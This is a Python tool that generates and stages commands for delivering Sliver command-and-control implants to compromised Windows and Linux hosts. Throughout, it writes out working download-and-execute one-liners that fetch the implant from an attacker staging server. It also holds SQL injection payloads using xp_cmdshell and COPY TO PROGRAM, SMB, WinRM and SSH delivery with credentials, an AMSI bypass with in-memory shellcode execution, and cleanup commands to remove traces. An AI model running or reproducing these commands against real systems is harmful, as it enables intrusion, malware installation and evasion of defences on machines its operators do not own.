#!/usr/bin/env python3
"""deliver_payload.py — Deliver Sliver implants to compromised targets.

Generates delivery commands based on the access type and target OS.
Supports multiple delivery methods: download+execute, file upload,
memory injection, SMB/WinRM/SSH delivery.

Usage:
    python3 deliver_payload.py --access-type rce --implant /tmp/implant.exe --target-os windows --kali-ip 172.20.0.2
    python3 deliver_payload.py --access-type file_upload --implant /tmp/implant.elf --target-os linux
    python3 deliver_payload.py --access-type smb --implant /tmp/implant.exe --target 192.168.4.125 --creds 'user:pass'

Outputs:
    - Delivery command(s) to execute on/against the target
    - delivery_manifest.json with delivery details
"""

import argparse
import json
import logging
import os
import shlex
import subprocess
import sys
import time
from datetime import datetime, timezone

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    datefmt="%Y-%m-%dT%H:%M:%SZ",
)
log = logging.getLogger("deliver_payload")

STAGING_PORT = int(os.getenv("PAYLOAD_STAGING_PORT", "8080"))


def get_delivery_commands(
    access_type: str,
    implant_path: str,
    target_os: str,
    kali_ip: str,
    target_ip: str = "",
    creds: str = "",
    remote_path: str = "",
    staging_port: int = STAGING_PORT,
) -> dict:
    """Generate delivery commands based on access type and target OS.

    Returns a dict with:
      - staging_cmd: command to run on Kali to host the payload
      - delivery_cmd: command to execute on/against the target
      - cleanup_cmd: optional cleanup command
      - method: descriptive name of the delivery method
      - notes: usage notes
    """
    filename = os.path.basename(implant_path)
    staging_url = f"http://{kali_ip}:{staging_port}/{filename}"

    if target_os == "windows":
        default_remote = remote_path or r"C:\Windows\Temp\svc.exe"
    else:
        default_remote = remote_path or "/tmp/.svc"

    result = {
        "access_type": access_type,
        "implant_path": implant_path,
        "target_os": target_os,
        "kali_ip": kali_ip,
        "target_ip": target_ip,
        "staging_port": staging_port,
        "staging_url": staging_url,
    }

    access = access_type.lower().replace("-", "_")

    if access in ("rce", "command_exec", "cmd"):
        result.update(_delivery_rce(target_os, staging_url, default_remote, implant_path, staging_port))

    elif access in ("file_upload", "upload"):
        result.update(_delivery_file_upload(target_os, implant_path, default_remote))

    elif access in ("webshell", "web_shell"):
        result.update(_delivery_webshell(target_os, staging_url, default_remote, implant_path, staging_port))

    elif access in ("sqli", "sql_injection"):
        result.update(_delivery_sqli(target_os, staging_url, default_remote, implant_path, staging_port))

    elif access in ("smb", "smb_access"):
        result.update(_delivery_smb(target_ip, implant_path, default_remote, creds))

    elif access in ("winrm", "winrm_access"):
        result.update(_delivery_winrm(target_ip, staging_url, creds))

    elif access in ("ssh", "ssh_access"):
        result.update(_delivery_ssh(target_ip, implant_path, default_remote, creds))

    elif access in ("memory", "memory_only", "reflective"):
        result.update(_delivery_memory(target_os, staging_url, implant_path, staging_port))

    else:
        log.warning(f"Unknown access type '{access_type}', falling back to RCE download+execute")
        result.update(_delivery_rce(target_os, staging_url, default_remote, implant_path, staging_port))

    return result


def _delivery_rce(target_os, staging_url, remote_path, implant_path, staging_port):
    """Download + execute via command execution."""
    staging_dir = os.path.dirname(implant_path)

    if target_os == "windows":
        delivery_cmd = (
            f'powershell -ep bypass -c "Invoke-WebRequest -Uri \'{staging_url}\' '
            f"-OutFile '{remote_path}'; Start-Process '{remote_path}'\""
        )
        delivery_alt = (
            f'certutil -urlcache -split -f "{staging_url}" "{remote_path}" '
            f'&& start /b "" "{remote_path}"'
        )
        cleanup = f'del /f /q "{remote_path}"'
    else:
        delivery_cmd = (
            f"curl -sSL {staging_url} -o {remote_path} && "
            f"chmod +x {remote_path} && "
            f"nohup {remote_path} >/dev/null 2>&1 &"
        )
        delivery_alt = (
            f"wget -q {staging_url} -O {remote_path} && "
            f"chmod +x {remote_path} && "
            f"nohup {remote_path} >/dev/null 2>&1 &"
        )
        cleanup = f"rm -f {remote_path}"

    return {
        "method": "download_execute",
        "staging_cmd": f"cd {staging_dir} && python3 -m http.server {staging_port} &",
        "delivery_cmd": delivery_cmd,
        "delivery_alt": delivery_alt,
        "cleanup_cmd": cleanup,
        "remote_path": remote_path,
        "notes": "Requires outbound HTTP from target to Kali. Alt command uses certutil/wget as fallback.",
    }


def _delivery_file_upload(target_os, implant_path, remote_path):
    """Upload implant through a file upload vulnerability."""
    return {
        "method": "file_upload",
        "staging_cmd": None,
        "delivery_cmd": f"Upload {implant_path} via the file upload vulnerability to {remote_path}",
        "delivery_alt": None,
        "cleanup_cmd": f"rm -f {remote_path}" if target_os != "windows" else f'del /f /q "{remote_path}"',
        "remote_path": remote_path,
        "notes": (
            "Use the same upload mechanism that was used to prove the vulnerability. "
            "After upload, trigger execution via the upload path or a secondary RCE."
        ),
    }


def _delivery_webshell(target_os, staging_url, remote_path, implant_path, staging_port):
    """Use existing web shell to download and execute."""
    staging_dir = os.path.dirname(implant_path)

    if target_os == "windows":
        shell_cmd = (
            f'powershell -ep bypass -c "Invoke-WebRequest -Uri \'{staging_url}\' '
            f"-OutFile '{remote_path}'; Start-Process '{remote_path}'\""
        )
    else:
        shell_cmd = (
            f"curl -sSL {staging_url} -o {remote_path} && "
            f"chmod +x {remote_path} && "
            f"nohup {remote_path} >/dev/null 2>&1 &"
        )

    return {
        "method": "webshell_download",
        "staging_cmd": f"cd {staging_dir} && python3 -m http.server {staging_port} &",
        "delivery_cmd": f"Execute via web shell: {shell_cmd}",
        "delivery_alt": None,
        "cleanup_cmd": None,
        "remote_path": remote_path,
        "notes": "Pass the command through the web shell's execution mechanism.",
    }


def _delivery_sqli(target_os, staging_url, remote_path, implant_path, staging_port):
    """SQL injection with stacked queries (xp_cmdshell, COPY TO PROGRAM)."""
    staging_dir = os.path.dirname(implant_path)

    if target_os == "windows":
        delivery_cmd = (
            f"'; EXEC xp_cmdshell 'powershell -ep bypass -c "
            f"\"Invoke-WebRequest -Uri ''{staging_url}'' "
            f"-OutFile ''{remote_path}''; Start-Process ''{remote_path}''\"';--"
        )
    else:
        delivery_cmd = (
            f"'; COPY (SELECT '') TO PROGRAM "
            f"'curl -sSL {staging_url} -o {remote_path} && "
            f"chmod +x {remote_path} && {remote_path} &';--"
        )

    return {
        "method": "sqli_stacked",
        "staging_cmd": f"cd {staging_dir} && python3 -m http.server {staging_port} &",
        "delivery_cmd": delivery_cmd,
        "delivery_alt": None,
        "cleanup_cmd": None,
        "remote_path": remote_path,
        "notes": "Requires stacked queries (xp_cmdshell for MSSQL, COPY TO PROGRAM for PostgreSQL).",
    }


def _delivery_smb(target_ip, implant_path, remote_path, creds):
    """Upload via SMB and execute remotely."""
    filename = os.path.basename(implant_path)
    user_part = ""
    if creds:
        parts = creds.split(":", 1)
        if len(parts) == 2:
            user_part = f"-U '{parts[0]}%{parts[1]}'"
        else:
            user_part = f"-U '{creds}'"

    share_path = remote_path.replace("\\", "/").lstrip("/")
    # Extract drive letter for share name (e.g., C$ from C:\...)
    if ":" in remote_path:
        drive = remote_path.split(":")[0]
        share = f"{drive}$"
        rel_path = remote_path.split(":", 1)[1].lstrip("\\").lstrip("/")
    else:
        share = "C$"
        rel_path = share_path

    upload_cmd = f"smbclient //{target_ip}/{share} {user_part} -c 'put {implant_path} {rel_path}'"
    exec_cmd = f"impacket-psexec {creds}@{target_ip} '{remote_path}'"

    return {
        "method": "smb_upload_exec",
        "staging_cmd": None,
        "delivery_cmd": f"{upload_cmd} && {exec_cmd}",
        "delivery_alt": f"impacket-smbexec {creds}@{target_ip} '{remote_path}'",
        "cleanup_cmd": f"smbclient //{target_ip}/{share} {user_part} -c 'del {rel_path}'",
        "remote_path": remote_path,
        "notes": "Runs from Kali directly. Requires valid SMB credentials.",
    }


def _delivery_winrm(target_ip, staging_url, creds):
    """Deliver via WinRM (PowerShell remoting)."""
    user_pass = creds.split(":", 1) if creds else ["", ""]
    user = user_pass[0]
    password = user_pass[1] if len(user_pass) > 1 else ""

    delivery_cmd = (
        f"evil-winrm -i {target_ip} -u '{user}' -p '{password}' "
        f"-e 'IEX(New-Object Net.WebClient).DownloadString(\"{staging_url}\")'"
    )

    return {
        "method": "winrm_download",
        "staging_cmd": None,
        "delivery_cmd": delivery_cmd,
        "delivery_alt": None,
        "cleanup_cmd": None,
        "remote_path": None,
        "notes": "Requires WinRM access (port 5985/5986) and valid credentials.",
    }


def _delivery_ssh(target_ip, implant_path, remote_path, creds):
    """Upload via SCP and execute via SSH."""
    filename = os.path.basename(implant_path)
    user_part = ""
    ssh_opts = "-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null"

    if creds and ":" in creds:
        user, password = creds.split(":", 1)
        scp_cmd = f"sshpass -p {shlex.quote(password)} scp {ssh_opts} {implant_path} {user}@{target_ip}:{remote_path}"
        exec_cmd = (
            f"sshpass -p {shlex.quote(password)} ssh {ssh_opts} {user}@{target_ip} "
            f"'chmod +x {remote_path} && nohup {remote_path} >/dev/null 2>&1 &'"
        )
    elif creds:
        # Assume it's just a username (key-based auth)
        scp_cmd = f"scp {ssh_opts} {implant_path} {creds}@{target_ip}:{remote_path}"
        exec_cmd = (
            f"ssh {ssh_opts} {creds}@{target_ip} "
            f"'chmod +x {remote_path} && nohup {remote_path} >/dev/null 2>&1 &'"
        )
    else:
        scp_cmd = f"scp {ssh_opts} {implant_path} {target_ip}:{remote_path}"
        exec_cmd = (
            f"ssh {ssh_opts} {target_ip} "
            f"'chmod +x {remote_path} && nohup {remote_path} >/dev/null 2>&1 &'"
        )

    return {
        "method": "ssh_scp_exec",
        "staging_cmd": None,
        "delivery_cmd": f"{scp_cmd} && {exec_cmd}",
        "delivery_alt": None,
        "cleanup_cmd": f"ssh {ssh_opts} {target_ip} 'rm -f {remote_path}'",
        "remote_path": remote_path,
        "notes": "Runs from Kali directly. Requires SSH access to target.",
    }


def _delivery_memory(target_os, staging_url, implant_path, staging_port):
    """Memory-only execution (no file on disk)."""
    staging_dir = os.path.dirname(implant_path)

    if target_os == "windows":
        delivery_cmd = (
            'powershell -ep bypass -c "'
            "$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');"
            "$b=$a.GetField('amsiInitFailed','NonPublic,Static');"
            "$b.SetValue($null,$true);"
            f"$bytes=(New-Object Net.WebClient).DownloadData('{staging_url}');"
            "$mem=[System.Runtime.InteropServices.Marshal]::AllocHGlobal($bytes.Length);"
            '[System.Runtime.InteropServices.Marshal]::Copy($bytes,0,$mem,$bytes.Length)"'
        )
    else:
        delivery_cmd = (
            f"curl -sSL {staging_url} | python3 -c '"
            "import sys,ctypes,mmap;"
            "sc=sys.stdin.buffer.read();"
            "m=mmap.mmap(-1,len(sc),prot=mmap.PROT_READ|mmap.PROT_WRITE|mmap.PROT_EXEC);"
            "m.write(sc);"
            "ctypes.CFUNCTYPE(ctypes.c_void_p)(ctypes.addressof(ctypes.c_char.from_buffer(m)))()'"
        )

    return {
        "method": "memory_injection",
        "staging_cmd": f"cd {staging_dir} && python3 -m http.server {staging_port} &",
        "delivery_cmd": delivery_cmd,
        "delivery_alt": None,
        "cleanup_cmd": None,
        "remote_path": None,
        "notes": "No file written to disk. Requires shellcode format implant. AMSI bypass included for Windows.",
    }


def start_staging_server(implant_path: str, port: int) -> subprocess.Popen | None:
    """Start a temporary HTTP server to stage the payload."""
    staging_dir = os.path.dirname(implant_path)
    if not staging_dir:
        staging_dir = "/tmp"
    try:
        proc = subprocess.Popen(
            ["python3", "-m", "http.server", str(port)],
            cwd=staging_dir,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        log.info(f"Staging server started on port {port} (PID {proc.pid}), serving {staging_dir}")
        return proc
    except Exception as e:
        log.error(f"Failed to start staging server: {e}")
        return None


def main():
    parser = argparse.ArgumentParser(
        description="Generate payload delivery commands for Sliver implants",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )

    parser.add_argument("--access-type", required=True,
                        choices=["rce", "file_upload", "webshell", "sqli", "smb", "winrm", "ssh", "memory"],
                        help="Type of access gained on the target")
    parser.add_argument("--implant", required=True,
                        help="Path to the implant binary/shellcode")
    parser.add_argument("--target-os", required=True, choices=["windows", "linux", "darwin"],
                        help="Target operating system")
    parser.add_argument("--kali-ip", default=os.getenv("KALI_IP", "172.20.0.2"),
                        help="Kali container IP for staging (default: $KALI_IP or 172.20.0.2)")
    parser.add_argument("--target", default="",
                        help="Target IP address (required for SMB/WinRM/SSH)")
    parser.add_argument("--creds", default="",
                        help="Credentials as user:pass (for SMB/WinRM/SSH)")
    parser.add_argument("--remote-path", default="",
                        help="Custom remote path for the implant on target")
    parser.add_argument("--staging-port", type=int, default=STAGING_PORT,
                        help=f"HTTP staging port (default: {STAGING_PORT})")
    parser.add_argument("--start-server", action="store_true",
                        help="Actually start the HTTP staging server")
    parser.add_argument("--json", action="store_true",
                        help="Output as JSON")
    parser.add_argument("--save-manifest", default=None,
                        help="Save delivery manifest to specified path")

    args = parser.parse_args()

    if not os.path.isfile(args.implant):
        log.error(f"Implant file not found: {args.implant}")
        sys.exit(1)

    result = get_delivery_commands(
        access_type=args.access_type,
        implant_path=args.implant,
        target_os=args.target_os,
        kali_ip=args.kali_ip,
        target_ip=args.target,
        creds=args.creds,
        remote_path=args.remote_path,
        staging_port=args.staging_port,
    )

    result["generated_at"] = datetime.now(timezone.utc).isoformat()

    # Optionally start staging server
    if args.start_server and result.get("staging_cmd"):
        proc = start_staging_server(args.implant, args.staging_port)
        if proc:
            result["staging_server_pid"] = proc.pid

    if args.json:
        print(json.dumps(result, indent=2))
    else:
        print(f"[+] Delivery Method: {result['method']}")
        if result.get("staging_cmd"):
            print(f"\n[*] Staging Command (run on Kali):")
            print(f"    {result['staging_cmd']}")
        print(f"\n[*] Delivery Command (execute on/against target):")
        print(f"    {result['delivery_cmd']}")
        if result.get("delivery_alt"):
            print(f"\n[*] Alternative:")
            print(f"    {result['delivery_alt']}")
        if result.get("cleanup_cmd"):
            print(f"\n[*] Cleanup:")
            print(f"    {result['cleanup_cmd']}")
        if result.get("notes"):
            print(f"\n[!] Notes: {result['notes']}")

    # Save manifest
    manifest_path = args.save_manifest
    if manifest_path:
        os.makedirs(os.path.dirname(manifest_path) or ".", exist_ok=True)
        with open(manifest_path, "w") as f:
            json.dump(result, f, indent=2)
        log.info(f"Delivery manifest saved to {manifest_path}")


if __name__ == "__main__":
    main()
